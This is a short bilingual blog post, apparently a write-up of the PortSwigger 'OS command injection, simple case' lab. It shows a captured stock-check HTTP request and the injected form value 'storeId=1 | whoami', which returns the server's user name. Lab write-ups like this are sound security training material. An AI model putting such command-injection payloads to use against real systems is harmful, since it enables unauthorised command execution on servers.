---
layout: post
title: "simple case"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_CMD_Injection
author: ""
tags: ['PortSwigger_Lab', 'CMD_Injection']
---



# simple case

This lab contains an [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.


本實驗室包含產品庫存檢查器中的 [OS 命令注入](https://portswigger.net/web-security/os-command-injection) 漏洞。

應用程序執行一個包含用戶提供的產品和商店 ID 的 shell 命令，並在其響應中返回該命令的原始輸出。

解決實驗室，執行`whoami`命令來確定當前用戶的名字。




隨便點個view detail
```
https://0a1a00c003bed070c00424f4009b0003.web-security-academy.net/product?productId=3
```


下方有一個按鈕 bp抓包 :
三個選項
London
Paris
Milan

會到後端抓庫存。
43 units

BP抓包
```http
POST /product/stock HTTP/1.1
Host: 0a1a00c003bed070c00424f4009b0003.web-security-academy.net
Cookie: session=yJJP7f9QEVQkNBriLVurKAOjiZViiKAG
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a1a00c003bed070c00424f4009b0003.web-security-academy.net/product?productId=3
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a1a00c003bed070c00424f4009b0003.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

productId=3&storeId=1
```


感覺 storeId 跟儲存有關係，根據hint 可以嘗試在後面加入

storeId=1 | whoami

顯示user:
peter-HBDz5q



成功。